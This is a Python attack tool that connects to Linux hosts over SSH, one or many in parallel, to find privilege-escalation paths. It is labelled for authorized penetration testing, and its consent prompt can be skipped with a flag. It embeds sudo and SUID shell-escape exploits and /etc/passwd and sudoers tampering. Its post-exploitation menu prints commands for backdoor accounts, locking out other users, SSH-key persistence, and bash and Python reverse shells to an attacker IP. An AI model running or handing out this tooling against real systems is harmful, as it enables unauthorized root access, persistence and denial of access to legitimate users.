#!/usr/bin/env python3
"""
Remote Privilege Escalation Enumeration Script
Runs from attacker machine, connects to targets via SSH
For Ethical Hacking, Penetration Testing, and CTF scenarios only
"""

import paramiko
import sys
import json
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
from pathlib import Path
import time
import getpass

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class RemotePrivEscEnum:
    def __init__(self, host, port=22, username=None, password=None, key_file=None, timeout=30):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.key_file = key_file
        self.timeout = timeout
        self.ssh_client = None
        self.findings = []
        self.target_info = {}
        
    def print_banner(self):
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║            REMOTE PRIVILEGE ESCALATION ENUMERATION          ║
║                    FOR ETHICAL HACKING ONLY                 ║
║                    Target: {self.host:<30} ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner)
    
    def connect_ssh(self):
        """Establish SSH connection to target"""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            print(f"{Colors.BLUE}[i] Connecting to {self.host}:{self.port}...{Colors.END}")
            
            if self.key_file:
                # Use SSH key authentication
                key = paramiko.RSAKey.from_private_key_file(self.key_file)
                self.ssh_client.connect(
                    hostname=self.host,
                    port=self.port,
                    username=self.username,
                    pkey=key,
                    timeout=self.timeout
                )
            else:
                # Use password authentication
                self.ssh_client.connect(
                    hostname=self.host,
                    port=self.port,
                    username=self.username,
                    password=self.password,
                    timeout=self.timeout
                )
            
            print(f"{Colors.GREEN}[+] SSH connection established!{Colors.END}")
            return True
            
        except paramiko.AuthenticationException:
            print(f"{Colors.RED}[!] Authentication failed for {self.host}{Colors.END}")
            return False
        except socket.timeout:
            print(f"{Colors.RED}[!] Connection timeout to {self.host}{Colors.END}")
            return False
        except Exception as e:
            print(f"{Colors.RED}[!] Connection error: {str(e)}{Colors.END}")
            return False
    
    def execute_command(self, command, suppress_errors=True):
        """Execute command on remote system"""
        try:
            stdin, stdout, stderr = self.ssh_client.exec_command(command, timeout=30)
            exit_code = stdout.channel.recv_exit_status()
            
            if exit_code == 0:
                return stdout.read().decode('utf-8', errors='ignore').strip()
            else:
                if not suppress_errors:
                    error = stderr.read().decode('utf-8', errors='ignore').strip()
                    print(f"{Colors.RED}[!] Command failed: {command}\nError: {error}{Colors.END}")
                return ""
                
        except Exception as e:
            if not suppress_errors:
                print(f"{Colors.RED}[!] Command execution error: {str(e)}{Colors.END}")
            return ""
    
    def print_section(self, title):
        print(f"\n{Colors.YELLOW}{Colors.BOLD}{'='*60}")
        print(f"  {title}")
        print(f"{'='*60}{Colors.END}")
    
    def print_finding(self, category, description, recommendation="", severity="HIGH"):
        severity_colors = {
            "CRITICAL": Colors.RED + Colors.BOLD,
            "HIGH": Colors.RED,
            "MEDIUM": Colors.YELLOW,
            "LOW": Colors.BLUE
        }
        
        color = severity_colors.get(severity, Colors.WHITE)
        finding = f"{color}[!] {category} [{severity}]: {Colors.WHITE}{description}"
        if recommendation:
            finding += f"\n    {Colors.GREEN}→ Exploit: {recommendation}{Colors.END}"
        print(finding)
        self.findings.append({
            'category': category,
            'description': description,
            'recommendation': recommendation,
            'severity': severity
        })
    
    def print_info(self, info):
        print(f"{Colors.BLUE}[i] {info}{Colors.END}")
    
    def gather_system_info(self):
        """Gather basic system information"""
        self.print_section("SYSTEM RECONNAISSANCE")
        
        # Basic system info
        commands = {
            'hostname': 'hostname',
            'kernel': 'uname -a',
            'os_release': 'cat /etc/os-release 2>/dev/null || cat /etc/issue 2>/dev/null',
            'current_user': 'whoami',
            'user_id': 'id',
            'home_dir': 'pwd',
            'shell': 'echo $SHELL',
            'uptime': 'uptime'
        }
        
        for key, command in commands.items():
            result = self.execute_command(command)
            if result:
                self.target_info[key] = result
                self.print_info(f"{key.replace('_', ' ').title()}: {result}")
        
        # Check if already root
        if 'user_id' in self.target_info and 'uid=0(' in self.target_info['user_id']:
            print(f"{Colors.GREEN}[+] Already running as root! No privilege escalation needed.{Colors.END}")
            return False
        
        return True
    
    def check_sudo_permissions(self):
        """Check sudo permissions and misconfigurations"""
        self.print_section("SUDO ANALYSIS")
        
        # Check sudo version for vulnerabilities
        sudo_version = self.execute_command("sudo --version | head -1")
        if sudo_version:
            self.print_info(f"Sudo version: {sudo_version}")
            
            # Check for known vulnerable sudo versions
            if "1.8.27" in sudo_version or "1.8.28" in sudo_version:
                self.print_finding("SUDO", "Vulnerable sudo version (CVE-2019-14287)",
                                 "sudo -u#-1 /bin/bash", "CRITICAL")
        
        # Check sudo permissions
        sudo_list = self.execute_command("sudo -l 2>/dev/null")
        if sudo_list and "may not run sudo" not in sudo_list:
            self.print_info("Sudo permissions:")
            print(f"{Colors.WHITE}{sudo_list}{Colors.END}")
            
            # Analyze dangerous sudo permissions
            dangerous_patterns = {
                'ALL': ("Complete sudo access", "sudo su -", "CRITICAL"),
                '/bin/bash': ("Bash access as root", "sudo /bin/bash", "CRITICAL"),
                '/bin/sh': ("Shell access as root", "sudo /bin/sh", "CRITICAL"),
                'vim': ("Vim with sudo", "sudo vim -c ':!/bin/sh'", "HIGH"),
                'nano': ("Nano editor", "sudo nano; Ctrl+R Ctrl+X; reset; sh 1>&0 2>&0", "HIGH"),
                'find': ("Find command", "sudo find . -exec /bin/sh \\; -quit", "HIGH"),
                'python': ("Python interpreter", "sudo python -c 'import os; os.system(\"/bin/sh\")'", "HIGH"),
                'perl': ("Perl interpreter", "sudo perl -e 'exec \"/bin/sh\";'", "HIGH"),
                'ruby': ("Ruby interpreter", "sudo ruby -e 'exec \"/bin/sh\"'", "HIGH"),
                'awk': ("AWK command", "sudo awk 'BEGIN {system(\"/bin/sh\")}'", "HIGH"),
                'less': ("Less pager", "sudo less /etc/profile; !/bin/sh", "MEDIUM"),
                'more': ("More pager", "sudo more /etc/profile; !/bin/sh", "MEDIUM"),
                'cp': ("Copy command", "sudo cp /etc/passwd /tmp/passwd.bak && edit passwd file", "MEDIUM"),
                'NOPASSWD': ("No password required", "Commands can run without password", "HIGH")
            }
            
            for pattern, (desc, exploit, severity) in dangerous_patterns.items():
                if pattern in sudo_list:
                    self.print_finding("SUDO", desc, exploit, severity)
        else:
            self.print_info("No sudo permissions found")
    
    def check_suid_sgid_binaries(self):
        """Find and analyze SUID/SGID binaries"""
        self.print_section("SUID/SGID BINARY ANALYSIS")
        
        # Find SUID binaries
        suid_command = "find / -perm -4000 -type f 2>/dev/null"
        suid_files = self.execute_command(suid_command)
        
        if suid_files:
            self.print_info(f"Found {len(suid_files.split())} SUID binaries")
            
            # Define exploitable SUID binaries
            exploitable_binaries = {
                'vim': "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
                'nano': "nano; ^R^X reset; sh 1>&0 2>&0",
                'find': "find . -exec /bin/sh -p \\; -quit",
                'python': "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
                'python3': "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
                'perl': "perl -e 'exec \"/bin/sh\";'",
                'ruby': "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
                'awk': "awk 'BEGIN {system(\"/bin/sh\")}'",
                'bash': "bash -p",
                'sh': "sh -p",
                'cp': "cp /etc/passwd /tmp/passwd.bak; # then modify passwd",
                'mv': "mv /etc/passwd /tmp/passwd.bak; # create new passwd",
                'tar': "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                'zip': "zip /tmp/test.zip /tmp/test; # then zip executes shell",
                'systemctl': "systemctl status; !/bin/sh",
                'docker': "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
            }
            
            for suid_file in suid_files.split('\n'):
                if suid_file:
                    binary_name = suid_file.split('/')[-1]
                    self.print_info(f"SUID: {suid_file}")
                    
                    if binary_name in exploitable_binaries:
                        exploit_cmd = exploitable_binaries[binary_name].replace(binary_name, suid_file)
                        self.print_finding("SUID", f"Exploitable SUID binary: {suid_file}",
                                         exploit_cmd, "HIGH")
        
        # Find SGID binaries
        sgid_command = "find / -perm -2000 -type f 2>/dev/null"
        sgid_files = self.execute_command(sgid_command)
        
        if sgid_files:
            sgid_list = sgid_files.split('\n')
            self.print_info(f"Found {len(sgid_list)} SGID binaries")
            for sgid_file in sgid_list[:5]:  # Show first 5
                if sgid_file:
                    self.print_info(f"SGID: {sgid_file}")
    
    def check_writable_files(self):
        """Check for writable system files"""
        self.print_section("WRITABLE FILE ANALYSIS")
        
        critical_files = {
            '/etc/passwd': 'echo "newroot::0:0:root:/root:/bin/bash" >> /etc/passwd',
            '/etc/shadow': 'Edit shadow file to change root password',
            '/etc/sudoers': 'echo "username ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
            '/etc/crontab': 'Add malicious cron job',
            '/etc/hosts': 'Redirect domains for phishing'
        }
        
        for file_path, exploit in critical_files.items():
            writable = self.execute_command(f"test -w {file_path} && echo 'writable' || echo 'not writable'")
            if writable == 'writable':
                self.print_finding("WRITABLE", f"{file_path} is writable", exploit, "CRITICAL")
            else:
                self.print_info(f"{file_path}: {writable}")
        
        # Check for writable directories in PATH
        path = self.execute_command("echo $PATH")
        if path:
            for path_dir in path.split(':'):
                if path_dir:
                    writable = self.execute_command(f"test -w {path_dir} && echo 'writable' || echo 'not writable'")
                    if writable == 'writable':
                        self.print_finding("PATH", f"Writable PATH directory: {path_dir}",
                                         f"Create malicious binary in {path_dir}", "MEDIUM")
    
    def check_cron_jobs(self):
        """Analyze cron jobs for privilege escalation"""
        self.print_section("CRON JOB ANALYSIS")
        
        # Check user crontab
        user_cron = self.execute_command("crontab -l 2>/dev/null")
        if user_cron and "no crontab" not in user_cron:
            self.print_info("User crontab entries found")
            print(f"{Colors.WHITE}{user_cron}{Colors.END}")
        
        # Check system cron files
        cron_files = ['/etc/crontab', '/etc/cron.d/*', '/var/spool/cron/*']
        
        for cron_pattern in cron_files:
            cron_content = self.execute_command(f"cat {cron_pattern} 2>/dev/null")
            if cron_content:
                self.print_info(f"System cron content found in {cron_pattern}")
                
                # Look for cron jobs running as root
                for line in cron_content.split('\n'):
                    if 'root' in line and not line.startswith('#'):
                        parts = line.split()
                        if len(parts) > 6:
                            script_path = parts[6]
                            # Check if script is writable
                            writable = self.execute_command(f"test -w {script_path} && echo 'writable'")
                            if writable == 'writable':
                                self.print_finding("CRON", f"Writable cron script running as root: {script_path}",
                                                 f"Modify {script_path} to escalate privileges", "HIGH")
        
        # Check for cron jobs with wildcards
        wildcard_cron = self.execute_command("grep -r '\\*' /etc/cron* 2>/dev/null")
        if wildcard_cron:
            for line in wildcard_cron.split('\n'):
                if '*' in line and 'root' in line:
                    self.print_finding("CRON", "Cron job with wildcards running as root",
                                     "Potential wildcard injection vulnerability", "MEDIUM")
    
    def check_running_processes(self):
        """Analyze running processes"""
        self.print_section("PROCESS ANALYSIS")
        
        # Get processes running as root
        root_processes = self.execute_command("ps aux | grep '^root' | head -10")
        if root_processes:
            self.print_info("Processes running as root (sample):")
            print(f"{Colors.WHITE}{root_processes}{Colors.END}")
        
        # Check for interesting services
        interesting_services = ['mysql', 'apache2', 'nginx', 'docker', 'ssh', 'ftp']
        
        for service in interesting_services:
            service_check = self.execute_command(f"ps aux | grep {service} | grep -v grep")
            if service_check:
                self.print_info(f"Service {service} is running")
                
                # Check service configurations
                if service == 'mysql':
                    mysql_config = self.execute_command("find /etc -name 'my.cnf' 2>/dev/null")
                    if mysql_config:
                        self.print_info(f"MySQL config: {mysql_config}")
    
    def check_network_services(self):
        """Check network services and open ports"""
        self.print_section("NETWORK SERVICE ANALYSIS")
        
        # Check listening ports
        netstat_output = self.execute_command("netstat -tuln 2>/dev/null || ss -tuln 2>/dev/null")
        if netstat_output:
            listening_ports = []
            for line in netstat_output.split('\n'):
                if 'LISTEN' in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        listening_ports.append(parts[3])
            
            self.print_info(f"Listening ports: {', '.join(listening_ports[:10])}")
        
        # Check for services running on localhost only
        localhost_services = self.execute_command("netstat -tuln 2>/dev/null | grep '127.0.0.1' || ss -tuln 2>/dev/null | grep '127.0.0.1'")
        if localhost_services:
            self.print_finding("NETWORK", "Services running on localhost only",
                             "Potential for port forwarding or tunneling", "MEDIUM")
    
    def check_kernel_exploits(self):
        """Check for kernel vulnerabilities"""
        self.print_section("KERNEL EXPLOIT ANALYSIS")
        
        kernel_version = self.execute_command("uname -r")
        os_info = self.target_info.get('os_release', '')
        
        if kernel_version:
            self.print_info(f"Kernel version: {kernel_version}")
            
            # Common kernel exploits (simplified check)
            kernel_exploits = {
                '2.6': ['DirtyCow (CVE-2016-5195)', 'Overlayfs (CVE-2015-1328)'],
                '3.': ['DirtyCow (CVE-2016-5195)', 'PERF_EVENTS (CVE-2013-2094)'],
                '4.': ['DirtyCow (CVE-2016-5195)', 'AF_PACKET (CVE-2016-8655)'],
                '5.': ['Dirty Pipe (CVE-2022-0847)', 'PwnKit (CVE-2021-4034)']
            }
            
            for version_pattern, exploits in kernel_exploits.items():
                if version_pattern in kernel_version:
                    for exploit in exploits:
                        self.print_finding("KERNEL", f"Potential kernel exploit: {exploit}",
                                         f"Research and compile exploit for kernel {kernel_version}", "HIGH")
    
    def check_environment_variables(self):
        """Check environment variables for sensitive information"""
        self.print_section("ENVIRONMENT VARIABLE ANALYSIS")
        
        env_vars = self.execute_command("env")
        if env_vars:
            sensitive_patterns = ['PASSWORD', 'SECRET', 'KEY', 'TOKEN', 'API']
            
            for line in env_vars.split('\n'):
                for pattern in sensitive_patterns:
                    if pattern in line.upper():
                        self.print_finding("ENVIRONMENT", f"Sensitive environment variable: {line}",
                                         "Extract credentials or tokens", "MEDIUM")
                        break
        
        # Check for LD_PRELOAD
        ld_preload = self.execute_command("echo $LD_PRELOAD")
        if ld_preload:
            self.print_finding("ENVIRONMENT", "LD_PRELOAD is set",
                             "Potential library hijacking opportunity", "MEDIUM")
    
    def generate_report(self):
        """Generate final report with all findings"""
        self.print_section("PRIVILEGE ESCALATION ASSESSMENT REPORT")
        
        if not self.findings:
            print(f"{Colors.GREEN}[+] No obvious privilege escalation vectors found.{Colors.END}")
            print(f"{Colors.YELLOW}[!] Consider manual enumeration and custom exploit research.{Colors.END}")
            return
        
        # Sort findings by severity
        severity_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
        sorted_findings = sorted(self.findings, key=lambda x: severity_order.get(x['severity'], 4))
        
        print(f"{Colors.RED}[!] Found {len(self.findings)} potential privilege escalation vectors:{Colors.END}\n")
        
        # Group by severity
        current_severity = None
        for i, finding in enumerate(sorted_findings, 1):
            if finding['severity'] != current_severity:
                current_severity = finding['severity']
                color = {
                    "CRITICAL": Colors.RED + Colors.BOLD,
                    "HIGH": Colors.RED,
                    "MEDIUM": Colors.YELLOW,
                    "LOW": Colors.BLUE
                }.get(current_severity, Colors.WHITE)
                print(f"\n{color}=== {current_severity} SEVERITY ==={Colors.END}")
            
            print(f"{Colors.BOLD}{i}. {finding['category']}:{Colors.END} {finding['description']}")
            if finding['recommendation']:
                print(f"   {Colors.GREEN}→ {finding['recommendation']}{Colors.END}")
            print()
    
    def post_exploitation_menu(self):
        """Post-exploitation options menu"""
        if not self.findings:
            return
        
        self.print_section("POST-EXPLOITATION OPTIONS")
        
        print(f"{Colors.YELLOW}WARNING: Only use in authorized penetration testing!{Colors.END}\n")
        
        print("Available post-exploitation actions:")
        print("1. Create backdoor user account")
        print("2. Disable other user accounts")
        print("3. Setup SSH key persistence")
        print("4. Create reverse shell script")
        print("5. Generate exploit commands")
        print("6. Export findings to JSON")
        print("0. Skip post-exploitation")
        
        try:
            choice = input(f"\n{Colors.CYAN}Select option (0-6): {Colors.END}")
            
            if choice == "1":
                self.create_backdoor_commands()
            elif choice == "2":
                self.disable_users_commands()
            elif choice == "3":
                self.ssh_persistence_commands()
            elif choice == "4":
                self.reverse_shell_commands()
            elif choice == "5":
                self.generate_exploit_commands()
            elif choice == "6":
                self.export_findings()
            else:
                print(f"{Colors.GREEN}Skipping post-exploitation options.{Colors.END}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Post-exploitation menu cancelled.{Colors.END}")
    
    def create_backdoor_commands(self):
        """Generate backdoor user creation commands"""
        backdoor_user = input(f"{Colors.CYAN}Enter backdoor username: {Colors.END}") or "sysadmin"
        backdoor_pass = input(f"{Colors.CYAN}Enter backdoor password: {Colors.END}") or "P@ssw0rd123"
        
        print(f"\n{Colors.RED}EXECUTE AS ROOT ON TARGET:{Colors.END}")
        print(f"{Colors.WHITE}")
        print(f"# Create backdoor user")
        print(f"useradd -m -s /bin/bash {backdoor_user}")
        print(f"echo '{backdoor_user}:{backdoor_pass}' | chpasswd")
        print(f"usermod -aG sudo {backdoor_user}")
        print(f"echo '{backdoor_user} ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
        print(f"mkdir -p /home/{backdoor_user}/.ssh")
        print(f"chmod 700 /home/{backdoor_user}/.ssh")
        print(f"chown {backdoor_user}:{backdoor_user} /home/{backdoor_user}/.ssh")
        print(f"{Colors.END}")
    
    def disable_users_commands(self):
        """Generate commands to disable other users"""
        print(f"\n{Colors.RED}USER ACCOUNT LOCKDOWN COMMANDS:{Colors.END}")
        print(f"{Colors.WHITE}")
        print("# List all users first:")
        print("cut -d: -f1 /etc/passwd | grep -v root | grep -v nobody | grep -v daemon")
        print("\n# Lock user accounts (replace 'username'):")
        print("usermod -L username")
        print("usermod -s /bin/false username")
        print("deluser username sudo")
        print("\n# Backup original files first:")
        print("cp /etc/passwd /tmp/passwd.backup")
        print("cp /etc/shadow /tmp/shadow.backup")
        print(f"{Colors.END}")
    
    def ssh_persistence_commands(self):
        """Generate SSH persistence commands"""
        print(f"\n{Colors.RED}SSH PERSISTENCE COMMANDS:{Colors.END}")
        print(f"{Colors.WHITE}")
        print("# Generate SSH key pair on attacker machine:")
        print("ssh-keygen -t rsa -b 4096 -f ./backdoor_key")
        print("\n# Add public key to target (as root):")
        print("mkdir -p /root/.ssh")
        print("echo 'your_public_key_here' >> /root/.ssh/authorized_keys")
        print("chmod 600 /root/.ssh/authorized_keys")
        print("chmod 700 /root/.ssh")
        print("\n# Connect using private key:")
        print(f"ssh -i ./backdoor_key root@{self.host}")
        print(f"{Colors.END}")
    
    def reverse_shell_commands(self):
        """Generate reverse shell commands"""
        attacker_ip = input(f"{Colors.CYAN}Enter your IP address: {Colors.END}")
        attacker_port = input(f"{Colors.CYAN}Enter listener port (default 4444): {Colors.END}") or "4444"
        
        print(f"\n{Colors.RED}REVERSE SHELL COMMANDS:{Colors.END}")
        print(f"{Colors.WHITE}")
        print(f"# Start listener on attacker machine:")
        print(f"nc -nlvp {attacker_port}")
        print(f"\n# Execute on target:")
        print(f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1")
        print(f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{attacker_ip}\",{attacker_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        print(f"{Colors.END}")
    
    def generate_exploit_commands(self):
        """Generate specific exploit commands based on findings"""
        print(f"\n{Colors.RED}EXPLOIT COMMANDS FOR FINDINGS:{Colors.END}")
        
        for i, finding in enumerate(self.findings, 1):
            if finding['recommendation']:
                print(f"\n{Colors.YELLOW}{i}. {finding['category']} - {finding['description']}{Colors.END}")
                print(f"{Colors.GREEN}Command: {finding['recommendation']}{Colors.END}")
    
    def export_findings(self):
        """Export findings to JSON file"""
        filename = f"privesc_enum_{self.host}_{int(time.time())}.json"
        
        report_data = {
            'target': self.host,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target_info': self.target_info,
            'findings': self.findings,
            'summary': {
                'total_findings': len(self.findings),
                'critical': len([f for f in self.findings if f['severity'] == 'CRITICAL']),
                'high': len([f for f in self.findings if f['severity'] == 'HIGH']),
                'medium': len([f for f in self.findings if f['severity'] == 'MEDIUM']),
                'low': len([f for f in self.findings if f['severity'] == 'LOW'])
            }
        }
        
        try:
            with open(filename, 'w') as f:
                json.dump(report_data, f, indent=2)
            print(f"{Colors.GREEN}[+] Findings exported to {filename}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to export findings: {str(e)}{Colors.END}")
    
    def run_full_enumeration(self):
        """Run the complete remote enumeration"""
        try:
            self.print_banner()
            
            if not self.connect_ssh():
                return False
            
            # Skip enumeration if already root
            if not self.gather_system_info():
                return True
            
            print(f"{Colors.CYAN}[i] Starting privilege escalation enumeration...{Colors.END}")
            
            # Run all enumeration modules
            self.check_sudo_permissions()
            self.check_suid_sgid_binaries()
            self.check_writable_files()
            self.check_cron_jobs()
            self.check_running_processes()
            self.check_network_services()
            self.check_kernel_exploits()
            self.check_environment_variables()
            
            # Generate report
            self.generate_report()
            
            # Post-exploitation options
            self.post_exploitation_menu()
            
            return True
            
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Enumeration interrupted by user.{Colors.END}")
            return False
        except Exception as e:
            print(f"\n{Colors.RED}[!] Error during enumeration: {str(e)}{Colors.END}")
            return False
        finally:
            if self.ssh_client:
                self.ssh_client.close()

def run_multiple_targets(targets_file, username, password=None, key_file=None, threads=5):
    """Run enumeration against multiple targets from file"""
    try:
        with open(targets_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except FileNotFoundError:
        print(f"{Colors.RED}[!] Targets file not found: {targets_file}{Colors.END}")
        return
    
    print(f"{Colors.CYAN}[i] Starting enumeration of {len(targets)} targets with {threads} threads...{Colors.END}\n")
    
    def enumerate_target(target):
        host_port = target.split(':')
        host = host_port[0]
        port = int(host_port[1]) if len(host_port) > 1 else 22
        
        enum = RemotePrivEscEnum(host, port, username, password, key_file)
        success = enum.run_full_enumeration()
        return (host, success, len(enum.findings))
    
    # Run enumeration with thread pool
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_target = {executor.submit(enumerate_target, target): target for target in targets}
        
        for future in as_completed(future_to_target):
            target = future_to_target[future]
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                print(f"{Colors.RED}[!] Error with target {target}: {str(e)}{Colors.END}")
                results.append((target, False, 0))
    
    # Summary of all targets
    print(f"\n{Colors.CYAN}{'='*60}")
    print("MULTI-TARGET ENUMERATION SUMMARY")
    print(f"{'='*60}{Colors.END}")
    
    successful = sum(1 for _, success, _ in results if success)
    total_findings = sum(findings for _, _, findings in results)
    
    print(f"Targets processed: {len(results)}")
    print(f"Successful connections: {successful}")
    print(f"Total findings: {total_findings}")
    
    print(f"\nPer-target results:")
    for host, success, findings in results:
        status = f"{Colors.GREEN}SUCCESS" if success else f"{Colors.RED}FAILED"
        print(f"  {host}: {status} - {findings} findings{Colors.END}")

def main():
    parser = argparse.ArgumentParser(
        description="Remote Privilege Escalation Enumeration Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Single target with password
  python3 remote_privesc.py -t 192.168.1.100 -u user -p password

  # Single target with SSH key
  python3 remote_privesc.py -t 192.168.1.100 -u user -k ~/.ssh/id_rsa

  # Multiple targets from file
  python3 remote_privesc.py -f targets.txt -u user -p password

  # Custom port and timeout
  python3 remote_privesc.py -t 192.168.1.100:2222 -u user -p password -T 60

Targets file format (one per line):
  192.168.1.100
  192.168.1.101:2222
  10.0.0.50
        """
    )
    
    # Target specification
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('-t', '--target', help='Single target IP/hostname[:port]')
    target_group.add_argument('-f', '--file', help='File containing target list')
    
    # Authentication
    parser.add_argument('-u', '--username', required=True, help='SSH username')
    auth_group = parser.add_mutually_exclusive_group()
    auth_group.add_argument('-p', '--password', help='SSH password')
    auth_group.add_argument('-k', '--key', help='SSH private key file')
    
    # Options
    parser.add_argument('-T', '--timeout', type=int, default=30, help='SSH timeout (default: 30)')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads for multiple targets (default: 5)')
    parser.add_argument('--no-confirm', action='store_true', help='Skip authorization confirmation')
    
    args = parser.parse_args()
    
    # Authorization confirmation
    if not args.no_confirm:
        print(f"{Colors.BOLD}Remote Privilege Escalation Enumeration Tool{Colors.END}")
        print(f"{Colors.YELLOW}For authorized penetration testing and ethical hacking only!{Colors.END}\n")
        
        confirm = input(f"{Colors.CYAN}Confirm this is authorized testing (yes/no): {Colors.END}")
        if confirm.lower() not in ['yes', 'y']:
            print(f"{Colors.RED}Exiting - Only use for authorized testing!{Colors.END}")
            sys.exit(1)
    
    # Get password if not provided and no key specified
    password = args.password
    if not password and not args.key:
        password = getpass.getpass(f"{Colors.CYAN}Enter SSH password: {Colors.END}")
    
    try:
        if args.file:
            # Multiple targets
            run_multiple_targets(args.file, args.username, password, args.key, args.threads)
        else:
            # Single target
            host_port = args.target.split(':')
            host = host_port[0]
            port = int(host_port[1]) if len(host_port) > 1 else 22
            
            enum = RemotePrivEscEnum(host, port, args.username, password, args.key, args.timeout)
            enum.run_full_enumeration()
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Tool interrupted by user.{Colors.END}")
        sys.exit(1)
    except Exception as e:
        print(f"{Colors.RED}[!] Unexpected error: {str(e)}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    # Check for required dependencies
    try:
        import paramiko
    except ImportError:
        print(f"{Colors.RED}[!] Missing required dependency: paramiko{Colors.END}")
        print(f"{Colors.CYAN}Install with: pip3 install paramiko{Colors.END}")
        sys.exit(1)
    
    main()
